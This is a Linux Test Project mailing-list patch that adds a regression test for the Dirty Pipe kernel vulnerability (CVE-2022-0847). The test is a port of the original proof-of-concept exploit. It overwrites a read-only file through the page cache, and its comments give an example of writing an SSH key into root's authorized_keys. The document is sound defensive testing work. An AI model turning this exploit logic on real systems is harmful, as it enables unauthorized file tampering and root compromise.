Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 29E8DC433EF
	for <ltp@archiver.kernel.org>; Thu,  7 Jul 2022 09:43:57 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 66C993C9737
	for <ltp@archiver.kernel.org>; Thu,  7 Jul 2022 11:43:55 +0200 (CEST)
Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::3])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (P-384))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 091993C071B
 for <ltp@lists.linux.it>; Thu,  7 Jul 2022 11:43:42 +0200 (CEST)
Received: from mail1.bemta37.messagelabs.com (mail1.bemta37.messagelabs.com
 [85.158.142.112])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by in-3.smtp.seeweb.it (Postfix) with ESMTPS id D33951A006EF
 for <ltp@lists.linux.it>; Thu,  7 Jul 2022 11:43:40 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fujitsu.com;
 s=170520fj; t=1657187019; i=@fujitsu.com;
 bh=t0PJ5GaiJ6ZIyjNm3jJunjqfw4K0Y3LRl7aPH2Q2U7w=;
 h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Type;
 b=phwSthF5Nuyw+Ia8OP1NECcZ/CqHJIkh+VkFIIigJx/V9yYHYC1AWz7At6ojMMRVJ
 lILpztNC00Dn7Ab3yij0CzoQw5WcDANb1Hp9sTkXwJITcbu5fbzcx9kGlqk1Vn+9Qp
 9oys8gRWq0skI5cxdCY5EtE8j7FE4gmQW8m5sl8nPW1S7dVoL3dRGF0cr8reS5vM9g
 QL1dkLo/LBmp33VpxWvQq/KiwsLMbh19WdmIsLzCqFRJxjHBsng3Yr2YtfZo5zr2cq
 3Ak2VXe+7ro6yEx4xQjjqTd2Gl9p0yRLL4irjSbu6LCc6y10/Kc2t77x7jMT2A+DGW
 HiBTBERj58yHg==
X-Brightmail-Tracker: H4sIAAAAAAAAA+NgFrrEIsWRWlGSWpSXmKPExsViZ8ORqHt61bE
 kg/ebuSxWfN/B6MDose/3OtYAxijWzLyk/IoE1oyzy8+wFay3qHgy5z5bA2OPfhcjF4eQwFlG
 ic7nt5kgnANMEq8al0I5uxklevafZeli5ORgE9CUeNa5gBnEFhGQkOhoeMsOYjMLqEssn/QLq
 IGDQ1jAXmLvHmWQMIuAisT7M5eZQGxeAQ+J6Zf3sYHYEgIKElMevmeGiAtKnJz5hAVijITEwR
 cvmCFqFCUudXxjhLArJF4fvgQVV5O4em4T8wRG/llI2mchaV/AyLSK0SapKDM9oyQ3MTNH19D
 AQNfQ0FTX0hJIWeolVukm6qWW6ublF5Vk6BrqJZYX66UWF+sVV+Ym56To5aWWbGIEBmZKcXL5
 Dsbt+37pHWKU5GBSEuVlXn4sSYgvKT+lMiOxOCO+qDQntfgQowwHh5IEb9FKoJxgUWp6akVaZ
 g4wSmDSEhw8SiK8U1cApXmLCxJzizPTIVKnGO05FvZf3cvMMXX2v/3MHMvB5MyvbQeYhVjy8v
 NSpcR5bUDaBEDaMkrz4IbCovoSo6yUMC8jAwODEE9BalFuZgmq/CtGcQ5GJWHeNJApPJl5JXC
 7XwGdxQR01rL8IyBnlSQipKQamKLvJMsrVIi8rtCdNnOBXtsFLvG8Y6LPmyr3Gvyo3fTSftnG
 1r0GEVtbet5vvrBfIuLo24dbvrm8cuh2vyVX5a50yiKl+W2g30YB858+KQsjWS6eNvqUP3EDj
 xvjw3tbN+VPnpeYUHuhx6BjgWv2VIV3R5Yd8nPJWhujGSB9udhoZ77+BQWh/mthdYvffbmpVc
 QarZ7Z4vTm0+IPHFJfn+64fd7rW+YNN83z9x/H7mR06uQOTku0L2a/nZP989Ri1Z2ZcjwR97p
 5bQ9yOrBOt7let/qaKZfZ5SiL7m2TVX6JOkZsOvLOdPLWfg+LPSvKAxljF+kw5RwPcA7VLDJq
 PJT48c7qn06erBrhrkunKbEUZyQaajEXFScCAFpB5MFlAwAA
X-Env-Sender: xuyang2018.jy@fujitsu.com
X-Msg-Ref: server-13.tower-732.messagelabs.com!1657187018!76099!1
X-Originating-IP: [62.60.8.97]
X-SYMC-ESS-Client-Auth: outbound-route-from=pass
X-StarScan-Received: 
X-StarScan-Version: 9.86.8; banners=-,-,-
X-VirusChecked: Checked
Received: (qmail 12214 invoked from network); 7 Jul 2022 09:43:39 -0000
Received: from unknown (HELO n03ukasimr01.n03.fujitsu.local) (62.60.8.97)
 by server-13.tower-732.messagelabs.com with ECDHE-RSA-AES256-GCM-SHA384
 encrypted SMTP; 7 Jul 2022 09:43:39 -0000
Received: from n03ukasimr01.n03.fujitsu.local (localhost [127.0.0.1])
 by n03ukasimr01.n03.fujitsu.local (Postfix) with ESMTP id 886C7100190
 for <ltp@lists.linux.it>; Thu,  7 Jul 2022 10:43:38 +0100 (BST)
Received: from R01UKEXCASM126.r01.fujitsu.local (R01UKEXCASM126
 [10.183.43.178])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-SHA384 (256/256 bits))
 (No client certificate requested)
 by n03ukasimr01.n03.fujitsu.local (Postfix) with ESMTPS id 7C10A100043
 for <ltp@lists.linux.it>; Thu,  7 Jul 2022 10:43:38 +0100 (BST)
Received: from localhost.localdomain (10.167.220.84) by
 R01UKEXCASM126.r01.fujitsu.local (10.183.43.178) with Microsoft SMTP Server
 (TLS) id 15.0.1497.32; Thu, 7 Jul 2022 10:43:36 +0100
From: Yang Xu <xuyang2018.jy@fujitsu.com>
To: <ltp@lists.linux.it>
Date: Thu, 7 Jul 2022 18:44:27 +0800
Message-ID: <1657190667-2220-1-git-send-email-xuyang2018.jy@fujitsu.com>
X-Mailer: git-send-email 1.8.3.1
MIME-Version: 1.0
X-Originating-IP: [10.167.220.84]
X-ClientProxiedBy: G08CNEXCHPEKD08.g08.fujitsu.local (10.167.33.83) To
 R01UKEXCASM126.r01.fujitsu.local (10.183.43.178)
X-Virus-Scanned: clamav-milter 0.102.4 at in-3.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] security/dirtypipe: Add test for CVE-2022-0847
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Fixes: #921
Signed-off-by: Yang Xu <xuyang2018.jy@fujitsu.com>
---
 runtest/cve                                   |   1 +
 runtest/syscalls                              |   1 +
 .../kernel/security/dirtypipe/.gitignore      |   1 +
 testcases/kernel/security/dirtypipe/Makefile  |   6 +
 .../kernel/security/dirtypipe/dirtypipe.c     | 195 ++++++++++++++++++
 5 files changed, 204 insertions(+)
 create mode 100644 testcases/kernel/security/dirtypipe/.gitignore
 create mode 100644 testcases/kernel/security/dirtypipe/Makefile
 create mode 100644 testcases/kernel/security/dirtypipe/dirtypipe.c

diff --git a/runtest/cve b/runtest/cve
index eaaaa19d7..9ab6dc282 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -72,5 +72,6 @@ cve-2021-4034 execve06
 cve-2021-22555 setsockopt08 -i 100
 cve-2021-26708 vsock01
 cve-2021-22600 setsockopt09
+cve-2022-0847 dirtypipe
 # Tests below may cause kernel memory leak
 cve-2020-25704 perf_event_open03
diff --git a/runtest/syscalls b/runtest/syscalls
index a0935821a..efef18136 100644
--- a/runtest/syscalls
+++ b/runtest/syscalls
@@ -1035,6 +1035,7 @@ process_vm_writev02 process_vm_writev02
 
 prot_hsymlinks prot_hsymlinks
 dirtyc0w dirtyc0w
+dirtypipe dirtypipe
 
 pselect01 pselect01
 pselect01_64 pselect01_64
diff --git a/testcases/kernel/security/dirtypipe/.gitignore b/testcases/kernel/security/dirtypipe/.gitignore
new file mode 100644
index 000000000..fdf39eed2
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/.gitignore
@@ -0,0 +1 @@
+/dirtypipe
diff --git a/testcases/kernel/security/dirtypipe/Makefile b/testcases/kernel/security/dirtypipe/Makefile
new file mode 100644
index 000000000..5ea7d67db
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/Makefile
@@ -0,0 +1,6 @@
+# SPDX-License-Identifier: GPL-2.0-or-later
+
+top_srcdir		?= ../../../..
+
+include $(top_srcdir)/include/mk/testcases.mk
+include $(top_srcdir)/include/mk/generic_leaf_target.mk
diff --git a/testcases/kernel/security/dirtypipe/dirtypipe.c b/testcases/kernel/security/dirtypipe/dirtypipe.c
new file mode 100644
index 000000000..dfe7f5985
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/dirtypipe.c
@@ -0,0 +1,195 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * Author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Ported into ltp by Yang Xu <xuyang2018.jy@fujitsu.com>
+ */
+
+/*\
+ * [Description]
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include "tst_test.h"
+
+#define TEXT "AAAAAAAABBBBBBBB"
+#define TESTFILE "testfile"
+#define CHUNK 64
+#define BUFSIZE 4096
+
+static int p[2] = {-1, -1}, fd = -1, page_size;
+static char *write_buf, *read_buf;
+
+static void check_file_contents(void)
+{
+	SAFE_LSEEK(fd, 0, SEEK_SET);
+	SAFE_READ(1, fd, read_buf, 4096);
+
+	if (memcmp(write_buf, read_buf, 4096) != 0)
+		tst_res(TFAIL, "read buf data mismatch, bug exists");
+	else
+		tst_res(TPASS, "read buff data match, bug doesn't exist");
+}
+
+/*
+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(void)
+{
+	unsigned int pipe_size, total, n, len;
+	char buffer[BUFSIZE];
+
+	SAFE_PIPE(p);
+	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);
+
+	/*
+	 * fill the pipe completely; each pipe_buffer will now have the
+	 * PIPE_BUF_FLAG_CAN_MERGE flag
+	 */
+	for (total = pipe_size; total > 0;) {
+		n = total > sizeof(buffer) ? sizeof(buffer) : total;
+		len = SAFE_WRITE(1, p[1], buffer, n);
+		total -= len;
+	}
+
+	/*
+	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
+	 * flags initialized)
+	 */
+	for (total = pipe_size; total > 0;) {
+		n = total > sizeof(buffer) ? sizeof(buffer) : total;
+		len = SAFE_READ(1, p[0], buffer, n);
+		total -= len;
+	}
+
+	/*
+	 * the pipe is now empty, and if somebody adds a new pipe_buffer
+	 * without initializing its "flags", the buffe wiill be mergeable
+	 */
+}
+
+static void run(void)
+{
+	off_t offset;
+	int data_size, len;
+	struct stat st;
+	ssize_t nbytes;
+	loff_t next_page, end_offset;
+
+	offset = 1;
+	data_size = strlen(TEXT);
+	next_page = (offset | (page_size - 1)) + 1;
+	end_offset = offset + (loff_t)data_size;
+	if (end_offset > next_page)
+		tst_brk(TFAIL, "Sorry, cannot write across a page boundary");
+
+	fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	SAFE_FSTAT(fd, &st);
+
+	if (offset > st.st_size)
+		tst_brk(TFAIL, "Offset is not inside the file");
+	if (end_offset > st.st_size)
+		tst_brk(TFAIL, "Sorry, cannot enlarget the file");
+
+	/*
+	 * create the pipe with all flags initialized with
+	 * PIPE_BUF_FLAG_CAN_MERGE
+	 */
+	prepare_pipe();
+
+	/*
+	 * splice one byte from before the specified offset into the pipe;
+	 * this will add a reference to the page cache, but since
+	 * copy_page_to_iter_pipe() does not initialize the "flags",
+	 * PIPE_BUF_FLAG_CAN_MERGE is still set
+	 */
+	--offset;
+	nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0)
+		tst_brk(TFAIL, "splice failed");
+	if (nbytes == 0)
+		tst_brk(TFAIL, "short splice");
+
+	/*
+	 * the following write will not create a new pipe_buffer, but
+	 * will instead write into the page cache, because of the
+	 *  PIPE_BUF_FLAG_CAN_MERGE flag
+	 */
+	len = SAFE_WRITE(1, p[1], TEXT, data_size);
+	if (len < nbytes)
+		tst_brk(TFAIL, "short write");
+
+	check_file_contents();
+	SAFE_CLOSE(p[0]);
+	SAFE_CLOSE(p[1]);
+	SAFE_CLOSE(fd);
+}
+
+static void setup(void)
+{
+	memset(write_buf, 0xff, 4096);
+
+	page_size = SAFE_SYSCONF(_SC_PAGESIZE);
+
+	/*write 4k 0xff to file*/
+	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);
+}
+
+static void cleanup(void)
+{
+	if (p[0] > -1)
+		SAFE_CLOSE(p[0]);
+	if (p[1] > -1)
+		SAFE_CLOSE(p[1]);
+	if (fd > -1)
+		SAFE_CLOSE(fd);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.cleanup = cleanup,
+	.test_all = run,
+	.needs_tmpdir = 1,
+	.bufs = (struct tst_buffers []) {
+		{&write_buf, .size = 4096},
+		{&read_buf, .size = 4096},
+		{},
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "9d2231c5d74e"},
+		{"CVE", "CVE-2022-0847"},
+		{},
+	}
+};
-- 
2.27.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
